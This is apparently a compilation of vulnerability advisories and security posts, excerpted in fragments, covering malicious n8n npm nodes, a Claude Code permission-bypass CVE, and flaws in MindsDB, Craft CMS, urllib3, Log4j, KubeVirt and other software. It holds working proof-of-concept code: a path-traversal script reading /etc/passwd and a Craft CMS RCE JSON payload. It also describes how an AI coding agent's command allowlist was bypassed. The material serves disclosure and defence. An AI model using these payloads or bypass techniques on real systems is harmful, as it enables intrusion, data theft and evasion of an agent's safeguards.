The campaign used packages masquerading as service integrations (example: Google Ads) and multiple malicious packages were removed from the npm registry; one package is tracked as GHSA-77g5-qpc3-x24r.</p><p>Technical details:<br />\u2022 Vulnerable platform: n8n (Node.js-based workflow automation) where community nodes are installed as npm packages and execute inside the n8n runtime.<br />\u2022 Notable package: n8n-nodes-hfgjf-irtuinvcm-lasdqewriit (posed as Google Ads node) that presented a credential form and exfiltrated OAuth tokens during workflow execution.<br />\u2022 Known identifiers: GHSA-77g5-qpc3-x24r, CVE-2026-21858 (Cyera reported &gt;100,000 n8n servers vulnerable to this RCE).<br />\u2022 Capabilities observed: runtime access to decrypted credentials, arbitrary outbound HTTP requests for exfiltration, file system and environment variable access due to lack of node sandboxing.</p><p>Analysis:<br />This campaign escalates supply-chain risk by targeting workflow automation platforms that centralize credentials. Unlike traditional npm malware focused on developer environments, malicious n8n nodes can act as gateways into dozens of integrated services (Google Ads, Stripe, Salesforce) because nodes receive decrypted API keys and OAuth tokens at runtime. The technique mirrors prior abuse of CI/CD workflows (e.g., Shai-Hulud) but leverages lower-scrutiny community ecosystems inside automation runtimes.</p><p>Detection (as reported):<br />\u2022 Monitor outbound HTTP traffic from n8n processes for anomalous destinations during workflow runs.<br />\u2022 Inspect installed community node packages for unexpected code that interacts with credential storage or performs network exfiltration.<br />\u2022 Correlate creation/use of OAuth credentials in workflows with external connections to unknown endpoints.</p><p>Actions taken (reported):<br />\u2022 Multiple malicious packages were removed from the npm registry.<br />\u2022 The incident is tracked with advisory identifiers such as GHSA-77g5-qpc3-x24r and discussions reference CVE-2026-21858 exposure statistics.</p><p>Limitations &amp; open questions:<br />\u2022 Public reporting does not quantify how many installations loaded community nodes that were malicious.<br />\u2022 The full list of exfiltration endpoints and actor attribution were not disclosed in the report.</p><p>\ud83d\udd39 n8n <a href=\"https://infosec.exchange/tags/supplychain\" class=\"mention hashtag\" rel=\"tag\">#<span>supplychain</span></a> <a href=\"https://infosec.exchange/tags/oauth\" class=\"mention hashtag\" rel=\"tag\">#<span>oauth</span></a> <a href=\"https://infosec.exchange/tags/nodejs\" class=\"mention hashtag\" rel=\"tag\">#<span>nodejs</span></a> <a href=\"https://infosec.exchange/tags/CVE\" class=\"mention hashtag\" rel=\"tag\">#<span>CVE</span></a>-2026-21858</p><p>\ud83d\udd17 Source: <a href=\"https://www.endorlabs.com/learn/n8mare-on-auth-street-supply-chain-attack-targets-n8n-ecosystem\" target=\"_blank\" rel=\"nofollow noopener\" translate=\"no\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">endorlabs.com/learn/n8mare-on-</span><span class=\"invisible\">auth-street-supply-chain-attack-targets-n8n-ecosystem</span></a></p>",

Multiple flaws in the blocklist/argument-filtering logic allowed eight distinct bypass paths that led to arbitrary command execution. The issues are tracked as CVE-2025-66032 and addressed in Claude Code v1.0.93.</p><p>Technical details:<br />\u2022 The permission model allowed pre-approved commands (an allowlist) and required manual approval otherwise. Default allowlisted commands included echo, sort, sed, and man.<br />\u2022 Blocklist checks relied on regular expressions intended to forbid dangerous flags or patterns in arguments, for example to block -P/--pager for man and -o/--output for sort.<br />\u2022 Specific bypasses discovered include:<br />\u2022 man --html style arguments that accept rendering helpers and can inject shell commands.<br />\u2022 sort --compress-program which delegates to an external program and can be leveraged to execute code via fed input.<br />\u2022 sed -e usage that allows command execution when argument parsing is not properly constrained.<br />\u2022 Ambiguous git argument parsing where certain inputs were misinterpreted and passed through.<br />\u2022 Chains of bash variable expansion that collapsed into executable commands when combined with other parsing gaps.</p><p>Analysis:<br />\u2022 Root cause is fragile argument validation based on regexes that did not comprehensively account for alternative flags, quoting forms, or differences in how subprograms consume inputs.<br />\u2022 Allowlisting read-only utilities without complete argument sanitization creates a blind spot: trusted binaries can be turned into execution vectors when they accept program or shell-like parameters.</p><p>Detection:<br />\u2022 Monitor conversational logs for allowlisted commands paired with unusual flags such as --html, --compress-program, -e/-E, or unexpected quoted payloads.<br />\u2022 Alert on sequences where multiple argument-parsing gaps appear in a single request (e.g., variable expansions plus program-specifying flags).</p><p>Mitigation and status:<br />\u2022 Claude Code team assigned CVE-2025-66032 and released fixes in v1.0.93 to harden blocklist logic and tighten parsing.<br />\u2022 Longer-term mitigations should replace ad-hoc regex-based argument filters with deterministic parsers and explicit allowlists of safe argument forms.</p><p>\ud83d\udd39 claudecode <a href=\"https://infosec.exchange/tags/CVE\" class=\"mention hashtag\" rel=\"tag\">#<span>CVE</span></a>-2025-66032 <a href=\"https://infosec.exchange/tags/commandinjection\" class=\"mention hashtag\" rel=\"tag\">#<span>commandinjection</span></a> <a href=\"https://infosec.exchange/tags/regex\" class=\"mention hashtag\" rel=\"tag\">#<span>regex</span></a> <a href=\"https://infosec.exchange/tags/llmsecurity\" class=\"mention hashtag\" rel=\"tag\">#<span>llmsecurity</span></a></p><p>\ud83d\udd17 Source: <a href=\"https://flatt.tech/research/posts/pwning-claude-code-in-8-different-ways/\" target=\"_blank\" rel=\"nofollow noopener\" translate=\"no\"><span class=\"invisible\">https://</span><span class=\"ellipsis\">flatt.tech/research/posts/pwni</span><span class=\"invisible\">ng-claude-code-in-8-different-ways/</span></a></p>",

But the check still\nmakes sense, task_work_add(&tsk->posix_cputimers_work.work) will fail\nanyway in this case.",

    "description": "### Summary\nAn unauthenticated path traversal in the file upload API lets any caller read arbitrary files from the server filesystem and move them into MindsDB\u2019s storage, exposing sensitive data. Severity: High.\n\n### Details\nThe PUT handler in file.py directly joins user-controlled data into a filesystem path when the request body is JSON and `source_type` is not `\"url\"`:\n\n- `data = request.json` (line ~104) accepts attacker input without validation.\n- `file_path = os.path.join(temp_dir_path, data[\"file\"])` (line ~178) creates the path inside a temporary directory, but if `data[\"file\"]` is absolute (e.g., `/home/secret.csv`), `os.path.join` ignores `temp_dir_path` and targets the attacker-specified location.\n- The resulting path is handed to `ca.file_controller.save_file(...)`, which wraps `FileReader(path=source_path)` (`mindsdb/interfaces/file/file_controller.py:66`), causing the application to read the contents of that arbitrary file. The subsequent `shutil.move(file_path, ...)` call also relocates the victim file into MindsDB\u2019s managed storage.\n\nOnly multipart uploads and URL-sourced uploads receive sanitization; JSON uploads lack any call to `clear_filename` or equivalent checks.\n\n### PoC\n1. Run MindsDB in Docker:\n   ```bash\n   docker pull mindsdb/mindsdb:latest\n   docker run --rm -it -p 47334:47334 --name mindsdb-poc mindsdb/mindsdb:latest\n   ```\n2. Execute the exploit from the host (save as poc.py and run with `python poc.py`):\n   ```python\n   # poc.py\n   import requests, json\n\n   base = \"http://127.0.0.1:47334\"\n   payload = {\"file\": \"../../../../../etc/passwd\"}  # no source_type -> hits vulnerable branch\n\n   r = requests.put(f\"{base}/api/files/leak_rel\", json=payload, timeout=10)\n   print(\"PUT status:\", r.status_code, r.text)\n\n   q = requests.post(\n       f\"{base}/api/sql/query\",\n       json={\"query\": \"SELECT * FROM files.leak_rel\"},\n       timeout=10,\n   )\n   print(\"SQL response:\", json.dumps(q.json(), indent=2))\n   ```\n3. The SQL response returns the contents of `/etc/passwd` . The original file disappears from its source location because the handler moves it into MindsDB\u2019s storage directory.\n\n### Impact\n- Any user able to reach the REST API can read and exfiltrate arbitrary files that the MindsDB process can access, potentially including credentials, configuration secrets, and private keys.",

The success of the attack would depend on the permissions of the web server process to access those files. \n\nRead files cannot be returned directly to the attacker.  Session file reads would only succeed if the file matched the expected session file format. If the file matched the session file format, the data would be populated into the server side session but not directly returned to the attacker unless the application logic returned specific session information.",

Prior to version 1.4.3, the cryptography_encrypt() function allocates multiple buffers for HTTP requests and JSON parsing that are never freed on any code path. Each call leaks approximately 400 bytes of memory. Sustained traffic can gradually exhaust available memory. This issue has been patched in version 1.4.3.",

    "description": "CryptoLib provides a software-only solution using the CCSDS Space Data Link Security Protocol - Extended Procedures (SDLS-EP) to secure communications between a spacecraft running the core Flight System (cFS) and a ground station. Prior to version 1.4.3, the libcurl write_callback function in the KMC crypto service client allows unbounded memory growth by reallocating response buffers without any size limit or overflow check. A malicious KMC server can return arbitrarily large HTTP responses, forcing the client to allocate excessive memory until the process is terminated by the OS. This issue has been patched in version 1.4.3.",

Prior to version 1.4.3, an out-of-bounds heap read vulnerability in cryptography_encrypt() occurs when parsing JSON metadata from KMC server responses. The flawed strtok iteration pattern uses ptr + strlen(ptr) + 1 which reads one byte past allocated buffer boundaries when processing short or malformed metadata strings.

    "description": "jsPDF is a library to generate PDFs in JavaScript. Prior to version 4.0.0, user control of the first argument of the loadFile method in the node.js build allows local file inclusion/path traversal. If given the possibility to pass unsanitized paths to the loadFile method, a user can retrieve file contents of arbitrary files in the local file system the node process is running in. The file contents are included verbatim in the generated PDFs. Other affected methods are `addImage`, `html`, and `addFont`. Only the node.js builds of the library are affected, namely the `dist/jspdf.node.js` and `dist/jspdf.node.min.js` files. The vulnerability has been fixed in jsPDF@4.0.0. This version restricts file system access per default. This semver-major update does not introduce other breaking changes. Some workarounds areavailable. With recent node versions, jsPDF recommends using the `--permission` flag in production. The feature was introduced experimentally in v20.0.0 and is stable since v22.13.0/v23.5.0/v24.0.0. For older node versions, sanitize user-provided paths before passing them to jsPDF.",

    "description": "Note that attackers must have administrator access to the Craft Control Panel for this to work.\n\nUsers should update to the patched versions (5.8.21 and 4.16.17) to mitigate the issue.\n\nResources:\n\nhttps://github.com/craftcms/cms/commit/6e608a1a5bfb36943f94f584b7548ca542a86fef\n\nhttps://github.com/craftcms/cms/commit/27f55886098b56c00ddc53b69239c9c9192252c7\n\nhttps://github.com/craftcms/cms/commit/ec43c497edde0b2bf2e39a119cded2e55f9fe593\n\nhttps://github.com/craftcms/cms/blob/5.x/CHANGELOG.md#5821---2025-12-04\n\n### Summary\n\nThis was reported as a vulnerability in Yii framework on August 7th (https://github.com/yiisoft/yii2/security/advisories/GHSA-gcmh-9pjj-7fp4). The Yii framework team denies responsibility for this (placing the onus on application developers) and hence has not (and seemingly will not) provide a fix at the framework level. Hence, I am reporting this to Craft as I found it to affect the latest (`5.6.0`) version of Craft CMS.\n\nLeveraging a legitimate but maliciously crafted Yii `Behavior` class, it\u2019s possible to trigger Remote Code Execution (RCE) via Reflection when the tainted `Behavior` is attached to a Yii `Component`, and an event is also fired on the tainted `Component`.\n\n### Details\nThis vulnerability is inspired by `CVE-2024-4990` but differs because a legitimate Yii `Behavior` class is used to abuse the magic `__set()` and `__get()` methods to trigger an arbitrary PHP callable, ultimately leading to RCE. As such, this bypasses the mitigations implemented for `CVE-2024-4990` and the related `CVE-2024-58136`.\n\nUsing the `as <behavior>` syntax in JSON POST input, it\u2019s possible to [attach](https://www.yiiframework.com/doc/guide/2.0/en/concept-behaviors#attaching-behaviors) `Behavior` classes to Yii `Components`, which was the crux of the vulnerability identified in `CVE-2024-4990`. Fixes for that vulnerability and the related `CVE-2024-58136` ensured that only classes of type `Behavior` could be attached to a `Component`. Craft CMS also implemented additional logic to prevent arbitrary `Behavior` classes from being attached to the vulnerable `Component`.\n\nA new vulnerability has been identified that bypasses the fixes for the previous vulnerabilities by using a legitimate but specially crafted `Behavior` class, namely the `yii\\behaviors\\AttributeTypecastBehavior`. Attaching a `Behavior` of this type allows the attacker to define an arbitrary callable that is triggered if any event is fired on the tainted `Component`.\n\nUsing a [wildcard](https://www.yiiframework.com/doc/guide/2.0/en/concept-events#wildcard-events) event listener (specified as `on *` in JSON input) allows the attacker to catch any event called on the tainted `Component` and redirect the flow of control to call `self::beforeSave` of the `AttributeTypecastBehavior`, triggering the attacker-defined callable and resulting in RCE.\n\nSee the commented payload below:\n\n```json\n{\n  \"as xxx\": {\n    \"__class\": \"yii\\\\behaviors\\\\AttributeTypecastBehavior\",\n    \"__construct()\": [\n      {\n        \"attributeTypes\": {\n          \"typecastBeforeSave\": [\"Psy\\\\Readline\\\\Hoa\\\\ConsoleProcessus\", \"execute\"] // Attacker defined callable\n        },\n        \"typecastBeforeSave\": \"touch /tmp/touch\" // Argument for the callable\n      }\n    ]\n  },\n  \"on *\": \"self::beforeSave\" // When any event is fired on the Component, call beforeSave() of the AttributeTypecastBehavior to trigger the attacker-defined callable with the argument above\n}\n```\n\nThis was found to affect two separate controllers/routes in Craft CMS admin functionality, though others may be affected:\n* /index.php?p=admin%2Factions%2Ffields%2Fapply-layout-element-settings\n* /index.php?p=admin%2Factions%2Ffields%2Frender-card-preview\n\n### PoC\n* Install Craft CMS via Composer:\n```\n$ composer create-project \"craftcms/craft\" app\n```\n* Use the built-in server to launch Craft CMS:\n```\n$ ./craft serve 127.0.0.1:9090\n```\n* The following HTTP traces show the payload used to trigger the vulnerability on each of the vulnerable routes:\n\n**/index.php?p=admin%2Factions%2Ffields%2Fapply-layout-element-settings**\n\n```\nPOST /index.php?p=admin%2Factions%2Ffields%2Fapply-layout-element-settings&v=1763562868146 HTTP/1.1\nHost: 127.0.0.1:9090\nUser-Agent: Mozilla/5.0 (X11;

    "description": "### Impact\n\nurllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.\n\nWhen streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.\n\nThe decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.\n\n\n### Affected usages\n\nApplications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.\n\n`stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.\n\n\n### Remediation\n\nUpgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.\n\nIf your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.\n\n\n### Credits\n\nThe issue was reported by @Cycloctane.\nSupplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/).",

    "description": "### Impact\n\nurllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.\n\nurllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.\n\nHowever, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).\n\n### Affected usages\n\nApplications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.\n\n\n### Remediation\n\nUpgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.\n\nIf upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source.",

Existing\nmitigations already protect kernel/KVM from a malicious guest. Userspace\ncan additionally be protected by flushing the branch predictors after a\nVMexit.\n\nSince it is the userspace that consumes the poisoned branch predictors,\nconditionally issue an IBPB after a VMexit and before returning to\nuserspace. Workloads that frequently switch between hypervisor and\nuserspace will incur the most overhead from the new IBPB.\n\nThis new IBPB is not integrated with the existing IBPB sites. For\ninstance, a task can use the existing speculation control prctl() to\nget an IBPB at context switch time. With this implementation, the\nIBPB is doubled up: one at context switch and another before running\nuserspace.\n\nThe intent is to integrate and optimize these cases post-embargo.\n\n[ dhansen: elaborate on suboptimal IBPB solution ]",

    "description": "### Summary\n\n**Description**\nA Path Traversal (CWE-22) vulnerability in AdonisJS multipart file handling may allow a remote attacker to write arbitrary files to arbitrary locations on the server filesystem. This impacts @adonisjs/bodyparser through version 10.1.1 and 11.x prerelease versions prior to 11.0.0-next.6. This issue has been patched in @adonisjs/bodyparser versions 10.1.2 and 11.0.0-next.6.\n\n### Details\nAdonisJS parses `multipart/form-data` via `BodyParser` and exposes uploads as `MultipartFile`. The issue is in the `MultipartFile.move(location, options)` default options. If `options.name` isn't provided, it defaults to the unsanitized client filename and builds the destination with `path.join(location, name)`, allowing a traversal to escape the default or intended directory chosen by the developer. If `options.overwrite` isn't provided, it defaults to true, allowing file overwrites. The documentation previously demonstrated examples leading developers to this vulnerable code path.\n### Impact\n\nExploitation requires a reachable upload endpoint. If a developer uses `MultipartFile.move()` without the second `options` argument or without explicitly sanitizing the filename, an attacker can supply a crafted `filename` value containing traversal sequences, writing to a destination path outside the intended upload directory. This can lead to arbitrary file write on the server.\n\nIf the attacker can overwrite application code, startup scripts, or configuration files that are later executed/loaded, RCE is possible. RCE is not guaranteed and depends on filesystem permissions, deployment layout, and application/runtime behavior.\n\n### Patches\nFixes targeting v6 and v7 have been published below.\n- https://github.com/adonisjs/bodyparser/releases/tag/v10.1.2\n- https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.6",

However, this CVE expands the scope of affected packages in two ways. \n\nFirst, while the entrypoint for the vulnerability was the tika-parser-pdf-module as reported in CVE-2025-54988, the vulnerability and its fix were in tika-core. Users who upgraded the tika-parser-pdf-module but did not upgrade tika-core to >= 3.2.2 would still be vulnerable. \n\nSecond, the original report failed to mention that in the 1.x Tika releases, the PDFParser was in the \"org.apache.tika:tika-parsers\" module.",

    "description": "# Summary\n\nLog4j versions prior to 2.16.0 are subject to a remote code execution vulnerability via the ldap JNDI parser.\nAs per [Apache's Log4j security guide](https://logging.apache.org/log4j/2.x/security.html): Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.16.0, this behavior has been disabled by default.\n\nLog4j version 2.15.0 contained an earlier fix for the vulnerability, but that patch did not disable attacker-controlled JNDI lookups in all situations. For more information, see the `Updated advice for version 2.16.0` section of this advisory.\n\n# Impact\n\nLogging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input. \n\n# Affected versions\n\nAny Log4J version prior to v2.15.0 is affected to this specific issue.\n\nThe v1 branch of Log4J which is considered End Of Life (EOL) is vulnerable to other RCE vectors so the recommendation is to still update to 2.16.0 where possible.\n\n## Security releases\nAdditional backports of this fix have been made available in versions 2.3.1, 2.12.2, and 2.12.3\n\n## Affected packages\nOnly the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.\n\n# Remediation Advice\n\n## Updated advice for version 2.16.0\n\nThe Apache Logging Services team provided updated mitigation advice upon the release of version 2.16.0, which [disables JNDI by default and completely removes support for message lookups](https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0).\nEven in version 2.15.0, lookups used in layouts to provide specific pieces of context information will still recursively resolve, possibly triggering JNDI lookups. This problem is being tracked as [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046). More information is available on the [GitHub Security Advisory for CVE-2021-45046](https://github.com/advisories/GHSA-7rjr-3q55-vv33).\n\nUsers who want to avoid attacker-controlled JNDI lookups but cannot upgrade to 2.16.0 must [ensure that no such lookups resolve to attacker-provided data and ensure that the the JndiLookup class is not loaded](https://issues.apache.org/jira/browse/LOG4J2-3221).\n\nPlease note that Log4J v1 is End Of Life (EOL) and will not receive patches for this issue.

To skip this check, the connection had to be done with QUIC\nwith ngtcp2 built to use GnuTLS and the user had to explicitly disable the\nstandard certificate verification.",

When Evolution data is processed by evo_priv.c from the DD+ bitstream, the decoder writes that data into a buffer. The length calculation for a write can overflow due to an integer wraparound. This can lead to the allocated buffer being too small, and the out-of-bounds check of the subsequent write to be ineffective, leading to an out-of-bounds write.",

    "description": "### Impact\nn8n contains a critical Remote Code Execution (RCE) vulnerability in its workflow expression evaluation system. Under certain conditions, expressions supplied by authenticated users during workflow configuration may be evaluated in an execution context that is not sufficiently isolated from the underlying runtime.\n\nAn authenticated attacker could abuse this behavior to execute arbitrary code with the privileges of the n8n process. Successful exploitation may lead to full compromise of the affected instance, including unauthorized access to sensitive data, modification of workflows, and execution of system-level operations.\n\n### Patches\nThis issue has been fixed in n8n v1.122.0.\n\nUsers are strongly advised to upgrade to version 1.122.0 or later, which introduces additional safeguards to restrict expression evaluation.\n\n### Workarounds\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n\n- Limit workflow creation and editing permissions to fully trusted users only.\n- Deploy n8n in a hardened environment with restricted operating system privileges and network access to reduce the impact of potential exploitation.\n\nThese workarounds do not fully eliminate the risk and should only be used as short-term measures.",

    "description": "### Impact\nA sandbox bypass vulnerability exists in the Python Code Node that uses Pyodide.\n\nAn authenticated user with permission to create or modify workflows can exploit this vulnerability to execute arbitrary commands on the host system running n8n, using the same privileges as the n8n process.\n\n### Patches\nIn n8n version 1.111.0, a task-runner-based native Python implementation was introduced as an optional feature, providing a more secure isolation model.\n\nTo enable it, you need to configure the `N8N_RUNNERS_ENABLED` and `N8N_NATIVE_PYTHON_RUNNER` environment variables.\n\nThis implementation became the default starting with n8n version 2.0.0.\n\n### Workarounds\n- Disable the Code Node by setting the environment variable `NODES_EXCLUDE: \"[\\\"n8n-nodes-base.code\\\"]\"` ([Docs)](https://docs.n8n.io/hosting/securing/blocking-nodes/)\n- Disable Python support in the Code node by setting the environment variable `N8N_PYTHON_ENABLED=false`, which was introduced in n8n version 1.104.0.\n- Configure n8n to use the task runner based Python sandbox via the `N8N_RUNNERS_ENABLED` and `N8N_NATIVE_PYTHON_RUNNER` environment variables. ([Docs](https://docs.n8n.io/hosting/configuration/task-runners/))\n\n### Resources\n- n8n documentation: [Blocking access to nodes](https://docs.n8n.io/hosting/securing/blocking-nodes/)\n- n8n documentation: [Code Node (Python)](https://docs.n8n.io/code/code-node/#python-native)\n- n8n documentation: [Task Runners](https://docs.n8n.io/hosting/configuration/task-runners/)",

    "description": "OpenPGP.js is a JavaScript implementation of the OpenPGP protocol. Startinf in version 5.0.1 and prior to versions 5.11.3 and 6.1.1, a maliciously modified message can be passed to either `openpgp.verify` or `openpgp.decrypt`, causing these functions to return a valid signature verification result while returning data that was not actually signed. This flaw allows signature verifications of inline (non-detached) signed messages (using `openpgp.verify`) and signed-and-encrypted messages (using `openpgp.decrypt` with `verificationKeys`) to be spoofed, since both functions return extracted data that may not match the data that was originally signed. Detached signature verifications are not affected, as no signed data is returned in that case. In order to spoof a message, the attacker needs a single valid message signature (inline or detached) as well as the plaintext data that was legitimately signed, and can then construct an inline-signed message or signed-and-encrypted message with any data of the attacker's choice, which will appear as legitimately signed by affected versions of OpenPGP.js. In other words, any inline-signed message can be modified to return any other data (while still indicating that the signature was valid), and the same is true for signed+encrypted messages if the attacker can obtain a valid signature and encrypt a new message (of the attacker's choice) together with that signature. The issue has been patched in versions 5.11.3 and 6.1.1. Some workarounds are available. When verifying inline-signed messages, extract the message and signature(s) from the message returned by `openpgp.readMessage`, and verify the(/each) signature as a detached signature by passing the signature and a new message containing only the data (created using `openpgp.createMessage`) to `openpgp.verify`.  When decrypting and verifying signed+encrypted messages, decrypt and verify the message in two steps, by first calling `openpgp.decrypt` without `verificationKeys`, and then passing the returned signature(s) and a new message containing the decrypted data (created using `openpgp.createMessage`) to `openpgp.verify`.",

    "description": "A path traversal vulnerability exists in rsync. It stems from behavior enabled by the `--inc-recursive` option, a default-enabled option for many client options and can be enabled by the server even if not explicitly enabled by the client. When using the `--inc-recursive` option, a lack of proper symlink verification coupled with deduplication checks occurring on a per-file-list basis could allow a server to write files outside of the client's intended destination directory. A malicious server could write malicious files to arbitrary locations named after valid directories/paths on the client.",

    "description": "### Summary\n_Short summary of the problem. Make the impact and severity as clear as possible.\n\nA flawed implementation of the Kubernetes aggregation layer's authentication flow could enable bypassing RBAC controls.\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\nIt was discovered that the `virt-api` component fails to correctly authenticate the client when receiving API requests over mTLS. In particular, it fails to validate the CN (Common Name) field in the received client TLS certificates against the set of allowed values defined in the `extension-apiserver-authentication` configmap. \n\nThe Kubernetes API server proxies received client requests through a component called aggregator (part of K8S's API server), and authenticates to the `virt-api` server using a certificate signed by the CA specified via the `--requestheader-client-ca-file` CLI flag. This CA bundle is primarily used in the context of aggregated API servers, where the Kubernetes API server acts as a trusted front-end proxy forwarding requests.\n\nWhile this is the most common use case, the same CA bundle can also support less common scenarios, such as issuing certificates to [authenticating](how-kubernetes-certificates-work) front-end [proxies](https://deepwiki.com/kubernetes/apiserver/7.1-authentication#request-header-authentication). These proxies can be deployed by organizations to extend Kubernetes' native authentication mechanisms or to integrate with existing identity systems (e.g., LDAP, OAuth2, SSO platforms). In such cases, the Kubernetes API server can trust these external proxies as legitimate authenticators, provided their client certificates are signed by the same CA as the one defined via `--requestheader-client-ca-file`.\nNevertheless, these external authentication proxies are not supposed to directly communicate with aggregated API servers.\n\nThus, by failing to validate the CN field in the client TLS certificate, the `virt-api` component may allow an attacker to bypass existing RBAC controls by directly communicating with the aggregated API server, impersonating the Kubernetes API server and its aggregator component.\n\nHowever, two key prerequisites must be met for successful exploitation:\n\n- The attacker must possess a valid front-end proxy certificate signed by the trusted CA (`requestheader-client-ca-file`). For example, they can steal the certificate material by compromising a front-end proxy or they could obtain a bundle by exploiting a poorly configured and managed PKI system.\n\n- The attacker must have network access to the `virt-api` service, such as via a compromised or controlled pod within the cluster.\n\nThese conditions significantly reduce the likelihood of exploitation. In addition, the `virt-api` component **acts as a sub-resource server**, meaning it only handles requests for specific resources and sub-resources . The handled by it requests are mostly related to the lifecycle of already existing resources.\n\nNonetheless, if met, the vulnerability could be exploited by a *Pod-Level Attacker* to escalate privileges, and manipulate existing virtual machine workloads potentially leading to violation of their CIA (Confidentiality, Integrity and Availability).\n\n### PoC\n_Complete instructions, including specific configuration details, to reproduce the vulnerability._\n\n#### Bypassing authentication\n\nIn this section, it is demonstrated how an attacker could use a certificate with a different CN field to bypass the authentication of the aggregation layer and perform arbitrary API sub-resource requests to the `virt-api` server.\n\nThe `kube-apiserver` has been launched with the following CLI flags:\n\n\n```bash\nadmin@minikube:~$ kubectl -n kube-system describe pod kube-apiserver-minikube | grep Command -A 28\n    Command:\n      kube-apiserver\n      --advertise-address=192.168.49.2\n      --allow-privileged=true\n      --authorization-mode=Node,RBAC\n      --client-ca-file=/var/lib/minikube/certs/ca.crt\n      --enable-admission-plugins=NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,DefaultTolerationSeconds,NodeRestriction,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota\n      --enable-bootstrap-token-auth=true\n      --etcd-cafile=/var/lib/minikube/certs/etcd/ca.crt\n      --etcd-certfile=/var/lib/minikube/certs/apiserver-etcd-client.crt\n      --etcd-keyfile=/var/lib/minikube/certs/apiserver-etcd-client.key\n      --etcd-servers=https://127.0.0.1:2379\n      --kubelet-client-certificate=/var/lib/minikube/certs/apiserver-kubelet-client.crt\n      --kubelet-client-key=/var/lib/minikube/certs/apiserver-kubelet-client.key\n      --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname\n      --proxy-client-cert-file=/var/lib/minikube/certs/front-proxy-client.crt\n      --proxy-client-key-file=/var/lib/minikube/certs/front-proxy-client.key\n      --requestheader-allowed-names=front-proxy-client\n      --requestheader-client-ca-file=/var/lib/minikube/certs/front-proxy-ca.crt\n      --requestheader-extra-headers-prefix=X-Remote-Extra-\n      --requestheader-group-headers=X-Remote-Group\n      --requestheader-username-headers=X-Remote-User\n      --secure-port=8443\n      --service-account-issuer=https://kubernetes.default.svc.cluster.local\n      --service-account-key-file=/var/lib/minikube/certs/sa.pub\n      --service-account-signing-key-file=/var/lib/minikube/certs/sa.key\n      --service-cluster-ip-range=10.96.0.0/12\n      --tls-cert-file=/var/lib/minikube/certs/apiserver.crt\n      --tls-private-key-file=/var/lib/minikube/certs/apiserver.key\n```\n\nBy default, Minikube generates a self-signed CA certificate (`var/lib/minikube/certs/front-proxy-ca.crt`) and use it to sign the certificate used by the aggregator (`/var/lib/minikube/certs/front-proxy-client.crt`):\n\n```bash\n# inspect the self-signed front-proxy-ca certificate\nadmin@minikube:~$ openssl x509 -text -in  /var/lib/minikube/certs/front-proxy-ca.crt | grep -e \"Issuer:\" -e \"Subject:\"\n        Issuer: CN = front-proxy-ca\n        Subject: CN = front-proxy-ca\n# inspect the front-proxy-client certificate signed with the above cert\n$ openssl x509 -text -in  /var/lib/minikube/certs/front-proxy-client.crt | grep -e \"Issuer:\" -e \"Subject:\"\n        Issuer: CN = front-proxy-ca\n        Subject: CN = front-proxy-client\n```\n\n\nOne can also inspect the contents of the `extension-apiserver-authentication` ConfigMap which is used as a trust anchor by all extension API servers:\n\n```bash\nadmin@minikube:~$ kubectl -n kube-system describe configmap extension-apiserver-authentication\nName:         extension-apiserver-authentication\nNamespace:    kube-system\nLabels:       <none>\nAnnotations:  <none>\n\nData\n====\nrequestheader-client-ca-file:\n----\n-----BEGIN

